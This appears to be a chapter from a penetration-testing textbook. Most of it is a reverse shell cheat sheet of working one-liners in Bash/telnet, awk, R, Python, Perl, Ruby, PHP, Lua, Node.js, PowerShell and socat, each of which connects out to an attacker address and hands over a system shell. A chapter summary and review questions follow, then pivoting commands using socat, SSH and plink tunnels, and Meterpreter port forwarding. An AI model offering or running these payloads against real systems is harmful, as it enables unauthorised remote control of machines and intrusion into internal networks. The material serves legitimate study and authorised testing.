# Telnet Reverse Shell
### Attacker Machine (Two Listeners):
1. **nc -lv 8080**
2. **nc -lv 8081**

**Command to Execute:**
```sh
telnet 192.168.2.6 8080 | /bin/bash | telnet 192.168.2.6 8081
```

**Explanation:**
- Commands will be executed on port 8080.
- The output of those commands will be printed to port 8081 on the attacker's machine.

# AWK Reverse Shell
**Command:**
```sh
awk 'BEGIN{s="/inet/tcp/0/192.168.2.6/8080";for(;s|&getline c;close(c))while(c|getline)p'
```

# R Reverse Shell
**Command:**
```r
R -e "require(socket); s <- socketConnection('192.168.2.6', 8080, blocking=FALSE, server=FALSE, open='a+b'); while(TRUE) { cmd <- readChar(s, 1024); system(cmd, intern=TRUE) }"
```

# Python Reverse Shells
### TCP-Based:
**Command:**
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.2.6",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### UDP-Based:
**Command:**
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);s.connect(("192.168.2.6",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### Base64 Encoded:
**Command:**
```python
python -c "exec('aW1wb3J0IHNvY2tldCAgICAsc3VicHJvY2VzcyAgICAsb3MgICAgIDtob3N0PSI')"
```

# Perl Reverse Shells
### TCP-Based (/bin/sh Dependent):
**Command:**
```perl
perl -e 'use Socket;$i="192.168.2.6";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### UDP-Based (/bin/sh Dependent):
**Command:**
```perl
perl -e 'use Socket;$i="192.168.0.106";$p=8080;socket(S,PF_INET,SOCK_DGRAM,getprotobyname("udp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### Without Using `/bin/sh`:
**Command:**
```perl
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.2.6:8080");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

### For Windows:
**Command:**
```perl
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"192.168.2.6:8080");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

# Ruby Reverse Shell
**Command:**
```ruby
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("192.168.2.6","8080");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

### Alternative:
**Command:**
```ruby
ruby -rsocket -e 'c=TCPSocket.new("192.168.0.106","8080");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

### `/bin/sh` Independent:
**Command:**
```ruby
ruby -rsocket -e 'f=TCPSocket.open("192.168.2.6",8080).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d", f,f,f)'
```

# PHP Reverse Shells
### Using `exec()` Function:
**Command:**
```php
php -r '$s=fsockopen("192.168.2.6",8080);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Using `shell_exec()` Function:
**Command:**
```php
php -r '$s=fsockopen("192.168.2.6",8080);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Using `system()` Function:
**Command:**
```php
php -r '$s=fsockopen("192.168.2.6",8080);system("/bin/sh -i <&3 >&3 2>&3");'
```

### Using `popen()` Function:
**Command:**
```php
php -r '$s=fsockopen("192.168.2.6",8080);popen("/bin/sh -i <&3 >&3 2>&3","r");'
```

### Using Just `/bin/sh`:
**Command:**
```php
php -r '$s=fsockopen("192.168.2.6",8080);`/bin/sh -i <&3 >&3 2>&3`;'
```

# Lua Reverse Shell
**Command:**
```lua
lua -e "local s=require('socket');local t=assert(s.tcp());t:connect('192.168.2.6',8080);while true do l=t:receive();os.execute(l);t:send('done') end"
```

# Node.js Reverse Shell
**Command:**
```javascript
node -e '(function(){ var require = global.require || global.process.mainModule.constructor._load; if (!require) return; var cmd = (global.process.platform.match(/win/i)) ? "cmd" : "/bin/sh"; var net = require("net"), cp = require("child_process"), util = require("util"), sh = cp.spawn(cmd, []); var client = this; var counter=0; function StagerRepeat(){ client.socket = net.connect(8080, "192.168.2.6", function() { client.socket.pipe(sh.stdin); if (typeof util.pump === "undefined") { sh.stdout.pipe(client.socket); sh.stderr.pipe(client.socket); } else { util.pump(sh.stdout, client.socket); util.pump(sh.stderr, client.socket); } }); socket.on("error", function(error) { counter++; if(counter<5) setTimeout(function() { StagerRepeat();}, 5*1000); else process.exit(); }); } StagerRepeat(); })();'
```

# PowerShell Reverse Shell
**Command:**
```powershell
powershell -w hidden -nop -c function RSC{if ($c.Connected -eq $true) {$c.Close()};if ($p.ExitCode -ne $null) {$p.Close()};exit;};$a='192.168.2.6';$p='8080';$c=New-Object system.net.sockets.tcpclient;$c.connect($a,$p);$s=$c.GetStream();$nb=New-Object System.Byte[] $c.ReceiveBufferSize;$p=New-Object System.Diagnostics.Process;$p.StartInfo.FileName='cmd.exe';$p.StartInfo.RedirectStandardInput=1;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.RedirectStandardError=1;$p.StartInfo.UseShellExecute=0;$p.Start();$is=$p.StandardInput;[byte[]]$b=0..65535|%{0};while($s.DataAvailable -or $p.HasExited -eq $false){if($s.DataAvailable){$i=0;$o=$s.Read($b,0,($b.Length));$str=[System.Text.Encoding]::UTF8.GetString($b,0,($o))-replace "`0","";$is.write($str);start-sleep 1;if($p.ExitCode -ne $null){RSC}else{$o=$p.StandardOutput.ReadToEnd();while($os.Peek() -ne -1){$o+=$e.GetString($os.Read())};$s.Write([System.Text.Encoding]::UTF8.GetBytes($o),0,($o.Length));$o=$null;$str=$null}}else{RSC}}
```

# Socat Reverse Shells
### Over TCP:
**Command:**
```sh
socat tcp-connect:192.168.2.6:8000 exec:'bash -li',pty,stderr,sane 2>&1 >/dev/null &
```

### Over UDP:
**Command:**
```sh
socat udp-connect:192.168.2.6:8000 exec:'bash -li',pty,stderr,sane 2>&1 >/dev/null &
```

### Over SSL:
**Command:**
```sh
socat exec:'bash -li',pty,stderr,setsid,sigint,sane openssl-connect:192.168.2.6:8000,key=$HOME/cert.pem,verify=0
```

# Summary
In this chapter, we explored the concept of reverse connections and reverse shell connections using tools such as Netcat, Ncat, OpenSSL, Socat, Cryptcat, and Powercat. We then tried different payloads to get reverse shell connections using Metasploit, including `reverse_tcp`, `reverse_tcp_rc4`, and `reverse_https`. We also saw an enhanced version of `reverse_https` by using a custom SSL certificate with an impersonation technique, a Meterpreter hijacking case scenario, paranoid mode, and getting a Meterpreter session over Ngrok. Finally, we provided a cheat sheet for reference when you need a reverse shell.

# Questions
1. Is it absolutely necessary to understand the concept of reverse shell connections?
2. Is it required to get a reverse shell over an encrypted channel?
3. Are there any GUI tools that can be used to generate Metasploit payloads?
4. Can we get Cryptcat for Windows?
5. Can we use a different stage encoder other than `shikata_ga_nai`?
6. Can we use paranoid mode in our red-team operations?
7. Is Ngrok free to use?

# Further Reading
For more information on the topics discussed in this chapter, please visit the following links:

- **Reverse Connection:**
- **Reverse Shell Cheat Sheet:**
- **InfoSec Resources:**
- **The GNU Netcat:**
- **Ncat Users' Guide:**
- **Powercat:**
- **CryptCat Project:**
- **Socat:**
- **Metasploit Framework:**
  - [How to Use a Reverse Shell in Metasploit](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-a-reverse-shell-in-Metasploit)
- **Meterpreter:**
  - [Meterpreter HTTP/HTTPS Communication](https://blog.rapid7.com/2011/06/29/meterpreter-httphttps-communication/)
- **Meterpreter Paranoid Mode:**
  - [Meterpreter Paranoid Mode](https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Paranoid-Mode)
- **Meterpreter Over Ngrok:**
  - [Meterpreter Over Ngrok](https://zircanavo-abyss.blogspot.com/2017/05/meterpreter-over-ngrok.html)

# Pivoting
Once we have gained access to a system using either a web application or service exploitation, our next goal is to gain access to the internal network that the system might be connected to. Before we explore the details of this, let's first try to understand a bit about port forwarding. Port forwarding is a method used to authorize an external device's access to an internal network. This is most commonly used by gamers. For example, imagine you're playing Counter-Strike and you want to play with your friends by creating a game server. However, those friends are not on the same network as you. To overcome this, you port forward an external port of your public IP to your machine's local port number.

### Simplest Method of Port Forwarding
The simplest method of port forwarding is through Socat. **Socat** is a command-line-based utility that establishes two bidirectional byte streams and transfers data between them. It is sometimes referred to as Netcat on steroids because it has many extra features that Netcat lacks.

### Example
If we want someone to connect to our SSH service running on port 22 from port 8080, we can run the following command on our system:
```sh
socat tcp-l:8080,fork,reuseaddr tcp:127.0.0.1:22
```
This command listens for incoming TCP connections on port 8080 and forwards them to local port 22, which is running the SSH service.

### Pivoting via SSH
This technique can be used to access the local ports on a machine that are not accessible from outside. Also known as SSH port forwarding or SSH tunneling, this technique allows us to establish an SSH session and then tunnel TCP connections through it.

### Example Scenario
Let's take a look at an example scenario where we have SSH access to a Linux system. This system has a VNC service running on the machine locally, but it is not visible or accessible from outside the network/system. By performing `netstat` on the machine, we can see that the machine has a VNC service running on port 5901. However, by running an `nmap` scan from outside, we can see that the port is not open.

### SSH Pivoting
We can use the following command on our system to forward the port of the remote system onto our system using the SSH tunnel:
```sh
ssh -L 5901:localhost:5901 user@remotehost
```
We can now run another `nmap` scan on our local machine to see that the port is now open. Since port 5901 is used for VNC, we can now connect to our local port 5901 using any VNC client.

### Command Syntax
```sh
ssh -L a:b:c:d user@remotehost
```
Where:
- `a` is the local port to which we want the port to be forwarded on our machine.
- `b` is the IP address of the machine inside the network.
- `c` is the port number of machine `b` that we want to access.
- `d` is the IP of the machine inside the network to which we already have SSH access.

### Pivoting via Plink (Windows)
Plink is a command-line connection tool similar to UNIX SSH. We can upload the `plink.exe` file onto a Windows machine and use the same command that we used previously to perform SSH port forwarding:
```sh
plink -R a:b:c:d user@remotehost
```
Plink can be downloaded from the following URL:
- [Plink Download](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html)

### Meterpreter Port Forwarding
Meterpreter also has a built-in feature that allows direct access to systems/services inside the network that are otherwise unreachable. The main difference between this and SSH tunneling is that SSH tunneling uses RSA encryption, whereas Meterpreter port forwarding happens over TLS.

### Example
To view the options of the `portfwd` command in Meterpreter, type `portfwd --help` into Meterpreter.